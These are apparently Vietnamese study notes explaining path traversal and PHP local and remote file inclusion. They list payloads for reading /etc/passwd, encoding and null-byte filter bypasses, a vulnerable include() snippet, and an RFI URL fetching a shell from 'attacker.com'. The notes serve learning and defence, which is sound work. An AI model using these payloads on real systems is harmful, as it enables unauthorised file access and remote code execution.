# Path Traversal & File Inclusion

## 1. Path Traversal (Directory Traversal)

> 💡 Path Traversal là gì?
Lỗ hổng này xảy ra khi ứng dụng web nhận đường dẫn tệp từ người dùng mà không kiểm soát hoặc lọc đầu vào (input) đúng cách. Điều này cho phép kẻ tấn công thay đổi đường dẫn để truy cập các tệp và thư mục nhạy cảm trên hệ thống (ví dụ: /etc/passwd, C:\\windows\\system.ini).
> 

> 🎯 Nguyên nhân chính
> 
> - Ứng dụng không lọc hoặc kiểm tra (sanitize/validate) đường dẫn từ đầu vào của người dùng.
> - Quản lý sai về quyền truy cập tệp của tiến trình máy chủ web.
> - Không sử dụng các hàm chuẩn, an toàn của HĐH để thao tác với đường dẫn tệp.

> 🛠️ Kỹ thuật khai thác (Payloads)
> 
> 
> ### A. Thoát thư mục (Directory Escape)
> 
> Sử dụng `../` (Linux/Unix) hoặc `..\\` (Windows) để đi lùi ra khỏi thư mục hiện tại.
> 
> ```bash
> # Ví dụ truy cập file passwd trên Linux
> ../../../../etc/passwd
> 
> # Ví dụ trên Windows
> ..\\..\\..\\windows\\system.ini
> 
> ```
> 
> ### B. Bypass bộ lọc (Filter Bypass)
> 
> Sử dụng khi ứng dụng cố gắng lọc chuỗi `../`.
> 
> - **URL Encoding (Mã hóa 1 lần):**
>     - `.` -> `%2e`
>     - `/` -> `%2f`
>     - `\\` -> `%5c`
>     - Payload: `%2e%2e%2f` hoặc `%2e%2e%5c`
> - **URL Double Encoding (Mã hóa 2 lần):**
>     - Dùng khi ứng dụng giải mã 1 lần rồi mới kiểm tra.
>     - `%` -> `%25`
>     - Payload: `%252e%252e%252f`
> - **Unicode Encoding:**
>     - `%u002e` (dấu chấm)
>     - `%u2215` (dấu gạch chéo)
> - **Các kỹ thuật khác:**
>     - `....//....//` (Bộ lọc chỉ thay thế 1 lần `../` thành rỗng)
>     - `..%c0%af` hoặc `..%ef%bc%8f` (UTF-8)
> 
> ### C. Bypass bằng NULL Byte
> 
> Dùng khi ứng dụng yêu cầu một phần mở rộng tệp (extension) cụ thể (ví dụ: `.png`).
> 
> > Ở một số trường hợp, ta có thể chèn ký tự NULL (%00) để "cắt" chuỗi, khiến ứng dụng "nghĩ" rằng tệp kết thúc ở đó, nhưng hệ thống file vẫn xử lý phần đứng trước NULL byte.
> > 
> 
> ```bash
> filename=../../../etc/passwd%00.png
> 
> ```
> 

---

## 2. File Inclusion

> 💡 File Inclusion là gì?
Lỗ hổng xảy ra khi ứng dụng web cho phép người dùng chỉ định một tệp để bao gồm (include) hoặc tải (load) vào trang mà không kiểm soát đúng cách. Kẻ tấn công có thể chèn đường dẫn tùy ý, dẫn đến LFI hoặc RFI.
> 

---

### 2.1. Local File Inclusion (LFI)

> Tổng quan
LFI (Local File Inclusion) là lỗ hổng cho phép kẻ tấn công đọc hoặc thực thi các tệp cục bộ (local) trên máy chủ.
> 
> 
> Điều này xảy ra khi ứng dụng không làm sạch (sanitize) đầu vào của người dùng trước khi đưa vào các hàm như `include()`, `require()`, `fopen()`.
> 

> Ví dụ (PHP)
> 
> 
> Mã nguồn bị lỗ hổng:
> 
> ```php
> <?php
>   $file = $_GET['page'];
>   include($file);
> ?>
> 
> ```
> 
> Payload khai thác (kết hợp Path Traversal):
> 
> ```
> <https://example.com/index.php?page=../../../../etc/passwd>
> 
> ```
> 

### 2.2. Remote File Inclusion (RFI)

> Tổng quan
RFI (Remote File Inclusion) là lỗ hổng cho phép ứng dụng web bao gồm (include) và thực thi các tệp từ một máy chủ từ xa (remote) do kẻ tấn công kiểm soát.
> 
> 
> Đây là lỗ hổng nghiêm trọng, thường dẫn đến Thực thi mã từ xa (RCE).
> 

> Điều kiện & Ví dụ
> 
> 
> Thường xảy ra khi cấu hình PHP (trong `php.ini`) bật cờ sau:
> 
> ```
> allow_url_include = On
> 
> ```
> 
> *(Lưu ý: Mặc định đã TẮT từ PHP 5 trở đi, nên RFI giờ ít phổ biến hơn LFI).*
> 
> Payload khai thác (tải shell từ máy chủ của kẻ tấn công):
> 
> ```
> <https://example.com/index.php?page=http://attacker.com/malicious_shell.txt>
> 
> ```
>